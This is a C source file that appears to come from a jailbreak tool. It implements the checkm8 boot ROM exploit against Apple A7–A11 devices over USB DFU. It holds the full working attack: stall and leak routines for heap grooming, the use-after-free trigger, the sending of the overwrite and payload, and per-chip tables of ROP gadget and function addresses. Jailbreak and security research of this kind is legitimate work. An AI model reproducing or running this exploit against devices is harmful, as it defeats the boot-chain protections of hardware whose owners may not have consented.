#include <exploit/checkm8.h>

// Start a new DFU transfer or continue an existing one
// Once finished, DFU will be ready for checkm8
bool checkm8_reset(usb_handle_t *handle) {
    transfer_ret_t transferRet;

    // Send zero-length packet to end existing transfer
    bool ret = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet);
    if (!ret) { goto fail; }
    if (transferRet.ret != USB_TRANSFER_OK || transferRet.sz != DFU_FILE_SUFFIX_LENGTH) { return false; }
    
    // Requests image validation like we are about to boot it
    ret = dfu_device_set_await_reset(handle);
    if (!ret) { goto fail; }

    // Start a new DFU transfer
    ret = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet);
    if (!ret) { goto fail; }
    if (transferRet.ret != USB_TRANSFER_OK || transferRet.sz != EP0_MAX_PACKET_SIZE) { goto fail; }

    // Ready for checkm8
    return true;

fail:
    // DFU abort on failure
    send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    LOG(LOG_ERROR, "Failed to reset device.");
    return false;
}

bool checkm8_stall(usb_handle_t *handle) {
    int usbAbortTimeout = 10;
    transfer_ret_t transferRet;
    while (send_usb_control_request_async_no_data(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0xC0, usbAbortTimeout, &transferRet)) {
        if (transferRet.sz < 0xC0
        && send_usb_control_request_async_no_data(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0x40, 1, &transferRet)
        && transferRet.sz == 0) {
            LOG(LOG_VERBOSE, "Stalled device.");
            return true;
        }
        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    LOG(LOG_ERROR, "Failed to stall device!");
    return false;
}

bool checkm8_usb_request_stall(usb_handle_t *handle) {
    return send_usb_control_request_no_data(handle, 0x2, DFU_GETSTATUS, 0, 0x80, 0, NULL);
}

bool checkm8_send_leaking_zlp(usb_handle_t *handle) {
    return send_usb_control_request_no_data(handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, NULL);
}

bool checkm8_send_normal_zlp(usb_handle_t *handle) {
    return send_usb_control_request_no_data(handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, NULL);
}

bool checkm8_heap_feng_shui(usb_handle_t *handle, struct DeviceConfiguration *config) {
    if (config->largeLeak == 0) {
        if (config->cpid >= 0x7000 && config->cpid <= 0x8003 && config->cpid != 0x8001) {
            while (!checkm8_usb_request_stall(handle) || !checkm8_send_leaking_zlp(handle) || !checkm8_send_normal_zlp(handle)) { }
        } else {
            // Stall endpoint (and leak a packet)
            if (!checkm8_stall(handle)) { return false; }

            // Send enough packets to fill the hole
            LOG(LOG_VERBOSE, "Sending %d normal ZLPs.", config->hole);
            for (int i = 0; i < config->hole; i++) {
                if (!checkm8_send_normal_zlp(handle)) { return false; }
            }

            // Add another leaking packet the end of the hole
            if (!checkm8_send_leaking_zlp(handle)) { return false; }

            // Make sure the conditions are correct
            // So that the packets are actually leaked
            // (latest wLength > queued packet wLength)
            if (!checkm8_send_normal_zlp(handle)) { return false; }
        }
    } else { // Unused as we don't have A7/A6 support yet

        // All packets are leaked - fill out the heap
        // such that there is a hole at the end for the IO buffer
        for (int i = 0; i < config->largeLeak; i++) {
            checkm8_usb_request_stall(handle);
        }

        // Abort DFU and leak the packets
        send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    }
    return true;
}

bool checkm8_trigger_UaF(usb_handle_t *handle, struct DeviceConfiguration *config) {
    unsigned usbAbortTimeout = USB_TIMEOUT;
    transfer_ret_t transferRet;

    // Keep asynchonously sending packets until we get a stall (which is actually the data not being sent)
    while (send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SIZE, usbAbortTimeout, &transferRet)) {

        // Overwrite padding to ensure we overwrite the correct data
        if (transferRet.sz < config->overwritePadding
        && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config->overwritePadding - transferRet.sz, &transferRet)
        && transferRet.ret == USB_TRANSFER_STALL) {

            // DFU abort and trigger the UaF
            send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
            return true;
        }

        // If we don't get a stall, something went wrong
        if (!send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
            break;
        }

        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    return false;
}

bool checkm8_send_overwrite_and_payload(usb_handle_t *handle, struct DeviceConfiguration *deviceConfig, struct PayloadConfiguration *payloadConfig, bool bootingPongoOS) {
    size_t overwriteSize = 0;
    size_t payloadSize = 0;

    uint8_t *overwrite = bootingPongoOS ? create_pongo_overwrite_for_device(payloadConfig, &overwriteSize) : create_gaster_overwrite_for_device(deviceConfig, payloadConfig, &overwriteSize);

    uint8_t *payload = bootingPongoOS ? create_pongo_payload_for_device(deviceConfig, &payloadSize) : create_gaster_payload_for_device(deviceConfig, payloadConfig, &payloadSize);

    if (!overwrite || overwriteSize == 0) {
        LOG(LOG_ERROR, "Failed to generate overwrite!");
        goto cleanup;
    }

    if (!payload || payloadSize == 0) {
        LOG(LOG_ERROR, "Failed to generate payload!");
        goto cleanup;
    }

    transfer_ret_t transferRet;

    // Why is this needed?
    if (deviceConfig->cpid >= 0x8001 && deviceConfig->cpid <= 0x8015 && deviceConfig->cpid != 0x8003) {
        if (!checkm8_usb_request_stall(handle)) { goto cleanup; }
        if (!checkm8_send_leaking_zlp(handle)) { goto cleanup; }
    }
	send_usb_control_request_no_data(handle, 2, DFU_GETSTATUS, 0, 0x80, 0, NULL);
	send_usb_control_request_no_data(handle, 2, DFU_GETSTATUS, 0, 0x80, 0, NULL);
    
    // Send overwrite and make sure the endpoint is still stalled
    if (send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwriteSize, &transferRet)
    && transferRet.ret == USB_TRANSFER_STALL) {
        
        // Reset the global state so we can send our payload?
        if (!bootingPongoOS && !send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) { goto cleanup; }
        bool ret = true;
        size_t packetSize = 0;

        for (int i = 0; ret && i < payloadSize; i += packetSize) {
            packetSize = MIN(payloadSize - i, DFU_MAX_TRANSFER_SIZE);
            LOG(LOG_VERBOSE, "Sending payload chunk of size 0x%x.", packetSize);
            // Send payload chunk
            ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &payload[i], packetSize, NULL);
        }

        if (ret) {
            // T8011 is fragile...
            if (deviceConfig->cpid != 0x8011) {
                send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, NULL);
                send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
            }
        } else {
            LOG(LOG_ERROR, "Failed to send payload!");
        }

        // This is the trigger for execution
        ret = send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
        LOG(LOG_SUCCESS, "Checkmate!");

        if (overwrite != NULL) { free(overwrite); }
        if (bootingPongoOS) return true;
        if (payload != NULL) { free(payload); }
        return true;
    } else {
        LOG(LOG_ERROR, "Failed to send overwrite!");
    }

cleanup:
    if (bootingPongoOS) return false;
    if (overwrite != NULL) { free(overwrite); }
    if (payload != NULL) { free(payload); }
    return false;
}

bool checkm8_find_device_configuration_for_cpid(int cpid, struct DeviceConfiguration *config) {
    bool foundMatchingConfiguration = true;
    switch (cpid) {
        case 0x8015:
        case 0x8012:
        case 0x8011:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x540;
            config->hole = 6;
            break;
        case 0x8010:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x5C0;
            config->hole = 5;
            break;
        case 0x8001:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x5C0;
            config->hole = 6;
            break;
        case 0x8003:
        case 0x8000:
        case 0x7001:
        case 0x7000:
            config->cpid = cpid;
            config->largeLeak = 0;
            config->overwritePadding = 0x500;
            config->hole = 0;
            break;
        default:
            LOG(LOG_ERROR, "CPID 0x%x is not supported!", cpid);
            if (cpid > 0x8015) {
                LOG(LOG_ERROR, "arm64e devices (A12 and newer) will never be supported.");
            }
            
            foundMatchingConfiguration = false;
            break;
    }
    return foundMatchingConfiguration;
}

bool checkm8_find_payload_configuration_for_cpid(int cpid, struct PayloadConfiguration *config) {
    bool foundMatchingConfiguration = true;
    switch (cpid) {
        case 0x8015:
            config->tlbi = 0x1000004AC;
            config->nopGadget = 0x10000A9C4;
            config->retGadget = 0x100000148;
            config->patchAddress = 0x10000624C;
            config->ttbr0Address = 0x18000C000;
			config->functionGadget = 0x10000A9AC;
			config->ttbr0Write = 0x10000045C;
			config->memcpyAddress = 0x10000E9D0;
			config->aesCryptoCommand = 0x100009E9C;
			config->bootTrampolineEnd = 0x18001C000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180003A78;
			config->dfu_handle_request_address = 0x180008638;
			config->usb_core_do_transfer = 0x10000B9A8;
			config->dfu_handle_bus_reset_address = 0x180008668;
			config->insecureMemoryBase = 0x18001C000;
			config->handle_interface_request = 0x10000BCCC;
			config->usb_create_string_descriptor = 0x10000AE80;
			config->usb_serial_number_string_descriptor = 0x1800008FA;
            break;
        case 0x8012:
            config->tlbi = 0x100000494;
            config->nopGadget = 0x100008DB8;
            config->retGadget = 0x10000012C;
            config->patchAddress = 0x100004854;
            config->ttbr0Address = 0x18000C000;
			config->functionGadget = 0x100008DA0;
			config->ttbr0Write = 0x100000444;
			config->memcpyAddress = 0x10000EA30;
			config->aesCryptoCommand = 0x1000082AC;
			config->bootTrampolineEnd = 0x18001C000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180003AF8;
			config->dfu_handle_request_address = 0x180008B08;
			config->usb_core_do_transfer = 0x10000BD20;
			config->dfu_handle_bus_reset_address = 0x180008B38;
			config->insecureMemoryBase = 0x18001C000;
			config->handle_interface_request = 0x10000BFFC;
			config->usb_create_string_descriptor = 0x10000B1CC;
			config->usb_serial_number_string_descriptor = 0x18000082A;
            break;
        case 0x8011:
            config->tlbi = 0x100000444;
            config->nopGadget = 0x10000CD0C;
            config->retGadget = 0x100000148;
            config->patchAddress = 0x100007630;
            config->ttbr0Address = 0x1800A0000;
			config->functionGadget = 0x10000CCEC;
			config->ttbr0Write = 0x1000003F4;
			config->memcpyAddress = 0x100010950;
			config->aesCryptoCommand = 0x10000C994;
			config->bootTrampolineEnd = 0x1800B0000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180083D28;
			config->dfu_handle_request_address = 0x180088A58;
			config->usb_core_do_transfer = 0x10000DD64;
			config->dfu_handle_bus_reset_address = 0x180088A88;
			config->insecureMemoryBase = 0x1800B0000;
			config->handle_interface_request = 0x10000E08C;
			config->usb_create_string_descriptor = 0x10000D234;
			config->usb_serial_number_string_descriptor = 0x18008062A;
            break;
        case 0x8010:
            config->tlbi = 0x100000434;
            config->nopGadget = 0x10000CC6C;
            config->retGadget = 0x10000015C;
            config->patchAddress = 0x1000074AC;
            config->ttbr0Address = 0x1800A0000;
			config->functionGadget = 0x10000CC4C;
			config->ttbr0Write = 0x1000003E4;
			config->memcpyAddress = 0x100010730;
			config->aesCryptoCommand = 0x10000C8F4;
			config->bootTrampolineEnd = 0x1800B0000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180083CF8;
			config->dfu_handle_request_address = 0x180088B48;
			config->usb_core_do_transfer = 0x10000DC98;
			config->dfu_handle_bus_reset_address = 0x180088B78;
			config->insecureMemoryBase = 0x1800B0000;
			config->handle_interface_request = 0x10000DFB8;
			config->usb_create_string_descriptor = 0x10000D150;
			config->usb_serial_number_string_descriptor = 0x1800805DA;
            break;
        case 0x8001:
            config->tlbi = 0x100000404;
            config->nopGadget = 0x10000CD60;
            config->retGadget = 0x100000118;
            config->patchAddress = 0x100007668;
            config->ttbr0Address = 0x180050000;
			config->functionGadget = 0x10000CD40;
			config->ttbr0Write = 0x1000003B4;
			config->memcpyAddress = 0x1000106F0;
			config->aesCryptoCommand = 0x10000C9D4;
			config->bootTrampolineEnd = 0x180044000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180047578;
			config->dfu_handle_request_address = 0x18004C378;
			config->usb_core_do_transfer = 0x10000DDA4;
			config->dfu_handle_bus_reset_address = 0x18004C3A8;
			config->insecureMemoryBase = 0x180000000;
			config->handle_interface_request = 0x10000E0B4;
			config->usb_create_string_descriptor = 0x10000D280;
			config->usb_serial_number_string_descriptor = 0x18004486A;
            break;
        case 0x8003:
        case 0x8000:
            config->patchAddress = 0x10000812C;
            config->ttbr0Address = 0x1800C8000;
			config->memcpyAddress = 0x100011030;
			config->aesCryptoCommand = 0x10000DAA0;
			config->bootTrampolineEnd = 0x1800E1000;
			config->ttbr0VROMOffset = 0x400;
			config->ttbr0SRAMOffset = 0x600;
			config->gUSBSerialNumber = 0x180087958;
			config->dfu_handle_request_address = 0x1800878F8;
			config->usb_core_do_transfer = 0x10000EE78;
			config->dfu_handle_bus_reset_address = 0x180087928;
			config->insecureMemoryBase = 0x180380000;
			config->handle_interface_request = 0x10000F1B0;
			config->usb_create_string_descriptor = 0x10000E354;
			config->usb_serial_number_string_descriptor = 0x1800807DA;
            break;
        case 0x7001:
            config->patchAddress = 0x10000AD04;
			config->memcpyAddress = 0x100013F10;
			config->aesCryptoCommand = 0x100010A90;
			config->bootTrampolineEnd = 0x1800E1000;
			config->gUSBSerialNumber = 0x180088E48;
			config->dfu_handle_request_address = 0x180088DF8;
			config->usb_core_do_transfer = 0x100011BB4;
			config->dfu_handle_bus_reset_address = 0x180088E18;
			config->insecureMemoryBase = 0x180380000;
			config->handle_interface_request = 0x100011EE4;
			config->usb_create_string_descriptor = 0x100011074;
			config->usb_serial_number_string_descriptor = 0x180080C2A;
            break;
        case 0x7000:
            config->patchAddress = 0x100007E98;
			config->memcpyAddress = 0x100010E70;
			config->aesCryptoCommand = 0x10000DA90;
			config->bootTrampolineEnd = 0x1800E1000;
			config->gUSBSerialNumber = 0x1800888C8;
			config->dfu_handle_request_address = 0x180088878;
			config->usb_core_do_transfer = 0x10000EBB4;
			config->dfu_handle_bus_reset_address = 0x180088898;
			config->insecureMemoryBase = 0x180380000;
			config->handle_interface_request = 0x10000EEE4;
			config->usb_create_string_descriptor = 0x10000E074;
			config->usb_serial_number_string_descriptor = 0x18008062A;
            break;
        default:
            LOG(LOG_ERROR, "CPID 0x%x is not supported!", cpid);
            foundMatchingConfiguration = false;
    }
    return foundMatchingConfiguration;
}